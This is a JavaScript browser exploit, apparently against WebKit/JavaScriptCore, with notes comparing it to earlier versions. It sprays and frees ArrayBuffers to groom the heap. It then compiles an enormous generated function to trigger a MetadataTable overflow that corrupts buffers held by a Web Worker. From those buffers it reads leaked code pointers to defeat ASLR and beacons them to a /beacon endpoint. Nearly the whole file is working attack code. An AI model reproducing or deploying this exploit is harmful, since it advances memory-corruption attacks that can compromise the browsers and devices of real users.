// p503 — MetadataTable overflow: worker-polled AB corruption for ASLR leak
//
// V500 FAILURE ANALYSIS:
//   IIFE approach → sweep runs during script evaluation → if sweep crashes or
//   takes too long, sc.onload never fires → scan never runs → no results.
//
// FIX: Use V466C-proven architecture:
//   - Bait-and-switch compilation (NOT IIFE) → separate compile + call
//   - Worker thread polls target ABs during sweep (like V466C polled strings)
//   - Worker ABs are in SAME FastMalloc heap (same process, Gigacage disabled)
//   - Sweep writes directly into worker AB backing stores
//   - Worker detects non-zero bytes and sends beacons BEFORE crash
//
// Flow:
//   Main: spray baits → signal worker → worker allocates targets →
//   Main: free baits → GC → compile → call function → sweep
//   Worker: busy-polls AB views → detects corruption → extracts thunk ptrs → beacons
//
// Beacon prefix: V503-

(function() {
  var T0 = Date.now();
  function B(tag, body) {
    try {
      var x = new XMLHttpRequest();
      x.open('POST', '/beacon/V503-' + tag, false);
      x.setRequestHeader('Content-Type', 'text/plain');
      x.send('[' + (Date.now() - T0) + 'ms] ' + (body || ''));
    } catch(e) {}
  }

  B('BOOT', navigator.userAgent);

  // Phase 1: Spray bait ABs — these will be freed to create holes at low addresses
  var BAIT_N = 100;
  var BUF_SZ = 100112; // sizeof(LinkingData)=16 + wrapped totalSize=100096
  var baits = new Array(BAIT_N);
  for (var i = 0; i < BAIT_N; i++) {
    baits[i] = new ArrayBuffer(BUF_SZ);
  }
  B('BAITS', 'n=' + BAIT_N + ',sz=' + BUF_SZ);

  // Phase 2: Create worker that allocates target ABs at HIGHER addresses
  var workerCode = [
    'var T0W = Date.now();',
    'function BW(tag, body) {',
    '  try {',
    '    var x = new XMLHttpRequest();',
    '    x.open("POST", "/beacon/V503-W-" + tag, false);',
    '    x.setRequestHeader("Content-Type", "text/plain");',
    '    x.send("[" + (Date.now() - T0W) + "ms] " + (body || ""));',
    '  } catch(e) {}',
    '}',
    '',
    'function hexByte(v) { return (v < 16 ? "0" : "") + v.toString(16); }',
    'function hex8(view, off) {',
    '  var s = "";',
    '  for (var i = 7; i >= 0; i--) s += hexByte(view[off + i]);',
    '  return s;',
    '}',
    'function u32(view, off) {',
    '  return (view[off] | (view[off+1] << 8) | (view[off+2] << 16) | ((view[off+3] << 24) >>> 0)) >>> 0;',
    '}',
    '',
    '// Allocate target ABs — these land at HIGHER addresses than main thread baits',
    'var TARGET_N = 100;',
    'var BUF_SZ = 100112;',
    'var targets = new Array(TARGET_N);',
    'var views = new Array(TARGET_N);',
    'for (var i = 0; i < TARGET_N; i++) {',
    '  targets[i] = new ArrayBuffer(BUF_SZ);',
    '  views[i] = new Uint8Array(targets[i]);',
    '}',
    'BW("TARGETS", "n=" + TARGET_N + ",sz=" + BUF_SZ);',
    '',
    '// Signal main thread that targets are ready',
    'postMessage({type: "ready"});',
    '',
    '// Phase: Poll for corruption',
    '// The sweep writes 112-byte entries sequentially. Non-zero bytes = corruption.',
    '// Sample every 8 bytes for speed (entry+24 has the thunk pointer)',
    'var found = false;',
    'var polls = 0;',
    'var MAX_POLLS = 500000;',
    '',
    'function pollOnce() {',
    '  polls++;',
    '  for (var vi = 0; vi < TARGET_N; vi++) {',
    '    var v = views[vi];',
    '    if (!v) continue;',
    '    // Quick scan: check first 1024 bytes for any non-zero',
    '    for (var q = 0; q < 1024 && q < v.length; q += 8) {',
    '      if (v[q] !== 0 || v[q+1] !== 0 || v[q+2] !== 0 || v[q+3] !== 0) {',
    '        return vi;',
    '      }',
    '    }',
    '  }',
    '  return -1;',
    '}',
    '',
    '// Wait for GO signal from main thread',
    'onmessage = function(e) {',
    '  if (e.data.type !== "go") return;',
    '  T0W = Date.now(); // reset timer relative to sweep start',
    '  BW("POLLING", "start");',
    '',
    '  // Busy poll until corruption detected or timeout',
    '  var hitIdx = -1;',
    '  for (var p = 0; p < MAX_POLLS; p++) {',
    '    hitIdx = pollOnce();',
    '    if (hitIdx >= 0) break;',
    '  }',
    '',
    '  if (hitIdx < 0) {',
    '    BW("NO-HIT", "polls=" + polls);',
    '    return;',
    '  }',
    '',
    '  BW("FIRST-HIT", "idx=" + hitIdx + ",polls=" + polls);',
    '',
    '  // Scan ALL targets for corruption',
    '  var hitCount = 0;',
    '  var leakedPtrs = [];',
    '',
    '  for (var vi = 0; vi < TARGET_N; vi++) {',
    '    var v = views[vi];',
    '    if (!v) continue;',
    '',
    '    // Count non-zero bytes',
    '    var nz = 0;',
    '    var firstOff = -1;',
    '    for (var j = 0; j < v.length; j++) {',
    '      if (v[j] !== 0) {',
    '        if (firstOff === -1) firstOff = j;',
    '        nz++;',
    '      }',
    '    }',
    '    if (nz === 0) continue;',
    '    hitCount++;',
    '',
    '    if (hitCount <= 3) {',
    '      BW("HIT-" + vi, "nz=" + nz + ",first=" + firstOff);',
    '',
    '      // Auto-detect entry alignment: find base where 8-byte blocks at stride 112 have most non-zero',
    '      var bestBase = -1, bestHits = 0;',
    '      for (var tryBase = 0; tryBase < 112; tryBase += 4) {',
    '        var hits = 0;',
    '        for (var off = tryBase; off + 8 <= v.length; off += 112) {',
    '          if (v[off] !== 0 || v[off+1] !== 0 || v[off+2] !== 0 || v[off+3] !== 0 ||',
    '              v[off+4] !== 0 || v[off+5] !== 0 || v[off+6] !== 0 || v[off+7] !== 0) hits++;',
    '        }',
    '        if (hits > bestHits) { bestHits = hits; bestBase = tryBase; }',
    '      }',
    '      BW("EBASE-" + vi, "base=" + bestBase + ",hits=" + bestHits);',
    '',
    '      // Extract thunk pointers at entryBase+24',
    '      var ptrsDumped = 0;',
    '      for (var eOff = bestBase; eOff + 112 <= v.length && ptrsDumped < 8; eOff += 112) {',
    '        var pOff = eOff + 24;',
    '        if (pOff + 8 > v.length) break;',
    '        if (v[pOff] === 0 && v[pOff+1] === 0 && v[pOff+2] === 0 && v[pOff+3] === 0 &&',
    '            v[pOff+4] === 0 && v[pOff+5] === 0 && v[pOff+6] === 0 && v[pOff+7] === 0) continue;',
    '        var h = hex8(v, pOff);',
    '        BW("THUNK-" + ptrsDumped, "off=" + pOff + ",val=0x" + h);',
    '        if (leakedPtrs.length < 5) leakedPtrs.push(h);',
    '        ptrsDumped++;',
    '      }',
    '',
    '      // Extract m_bytecodeIndex at entryBase+68',
    '      var idxDumped = 0;',
    '      for (var eOff = bestBase; eOff + 72 <= v.length && idxDumped < 3; eOff += 112) {',
    '        var iOff = eOff + 68;',
    '        if (iOff + 4 > v.length) break;',
    '        var val = u32(v, iOff);',
    '        if (val !== 0) {',
    '          BW("IDX-" + idxDumped, "off=" + iOff + ",val=" + val + ",hex=0x" + val.toString(16));',
    '          idxDumped++;',
    '        }',
    '      }',
    '',
    '      // Raw hex dump of first non-zero region',
    '      if (hitCount === 1) {',
    '        var chunks = [];',
    '        for (var off = 0; off + 8 <= 256 && off + 8 <= v.length; off += 8) {',
    '          if (v[off] !== 0 || v[off+1] !== 0 || v[off+2] !== 0 || v[off+3] !== 0 ||',
    '              v[off+4] !== 0 || v[off+5] !== 0 || v[off+6] !== 0 || v[off+7] !== 0) {',
    '            chunks.push(off + ":0x" + hex8(v, off));',
    '          }',
    '        }',
    '        if (chunks.length > 0) BW("RAW", chunks.slice(0, 12).join(" "));',
    '      }',
    '    }',
    '  }',
    '',
    '  // Summary',
    '  BW("RESULT", "hitBufs=" + hitCount + ",ptrs=" + leakedPtrs.length);',
    '  if (leakedPtrs.length > 0) {',
    '    BW("ASLR-LEAK", "ptr0=0x" + leakedPtrs[0]);',
    '  }',
    '  BW("DONE", "hitBufs=" + hitCount + ",ptrs=" + leakedPtrs.length);',
    '};'
  ].join('\n');

  var workerBlob = new Blob([workerCode], {type: 'application/javascript'});
  var workerUrl = URL.createObjectURL(workerBlob);
  var worker = new Worker(workerUrl);

  worker.onmessage = function(e) {
    if (e.data.type === 'ready') {
      B('WORKER-READY', '');
      startExploit();
    }
  };

  function startExploit() {
    // Phase 3: Free baits to create holes at low addresses
    var xferred = 0;
    for (var i = 0; i < BAIT_N; i++) {
      try {
        structuredClone(baits[i], {transfer: [baits[i]]});
        xferred++;
      } catch(e) {
        if (xferred === 0) { B('XFER-ERR', e.message); break; }
      }
      baits[i] = null;
    }
    baits = null;
    B('XFER', 'n=' + xferred);

    // Phase 4: Heavy GC to truly free bait backing stores
    for (var g = 0; g < 30; g++) {
      var junk = [];
      for (var j = 0; j < 1000; j++) junk.push(new ArrayBuffer(8192));
      junk = null;
    }
    B('GC-DONE', '');

    // Phase 5: Build bait-and-switch function (NOT IIFE)
    var N = 38348816;
    B('BUILD', 'N=' + N);

    var CHUNK = 4000000;
    var nC = Math.floor(N / CHUNK);
    var rem = N - nC * CHUNK;
    var rep = 'a();'.repeat(CHUNK);

    var parts = new Array(nC + 3);
    parts[0] = 'function __v503fn(a){';
    for (var c = 0; c < nC; c++) parts[1 + c] = rep;
    parts[nC + 1] = 'a();'.repeat(rem);
    parts[nC + 2] = '}';
    rep = null;

    var blob = new Blob(parts, {type: 'application/javascript'});
    B('BLOB', 'sz=' + Math.round(blob.size / 1048576) + 'MB');
    parts = null;

    var url = URL.createObjectURL(blob);
    var sc = document.createElement('script');

    sc.onerror = function() { B('SCRIPT-ERR', ''); };

    sc.onload = function() {
      B('COMPILED', window.__v503fn ? 'OK' : 'FAIL');

      if (!window.__v503fn) {
        B('DONE', 'compile-fail');
        return;
      }

      // Signal worker to start polling BEFORE we trigger the sweep
      worker.postMessage({type: 'go'});

      // Brief delay to let worker enter polling loop
      setTimeout(function() {
        B('CALLING', '');

        // This triggers: prepareForExecution → finishCreation → SWEEP
        // The sweep writes 4.29GB forward from MetadataTable base
        // Worker is simultaneously polling its ABs for corruption
        try {
          window.__v503fn(function(){});
          B('CALL-RETURNED', '');
        } catch(e) {
          B('CALL-ERR', e.message);
        }

        // If we survived, also scan from main thread
        // (worker already reported, but this is backup)
        B('MAIN-SURVIVED', '');
      }, 50);
    };

    document.head.appendChild(sc);
    sc.src = url;
  }
})();
